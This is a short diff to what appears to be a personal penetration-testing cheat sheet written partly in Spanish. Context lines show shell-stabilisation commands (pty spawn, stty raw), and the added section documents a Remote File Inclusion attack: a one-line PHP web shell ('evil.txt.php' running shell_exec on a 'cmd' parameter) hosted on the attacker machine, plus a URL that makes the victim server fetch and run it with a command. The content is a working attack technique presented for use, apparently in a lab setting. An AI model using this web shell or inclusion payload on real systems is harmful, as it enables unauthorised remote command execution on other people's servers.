@@ -27,5 +27,10 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo;fg
 reset
 terminal type? xterm-256color
+###RFI 
+se debe crear un archivo en el atacante
+└─# cat evil.txt.php                                                                                                                                                                                                     1 ⨯
+<?php echo shell_exec($_GET['cmd']);?>
+se ejecuta desde la victima
+http://192.168.239.10/menu.php?file=http://192.168.119.239/evil.txt.php&cmd=ipconfig
 ###
-
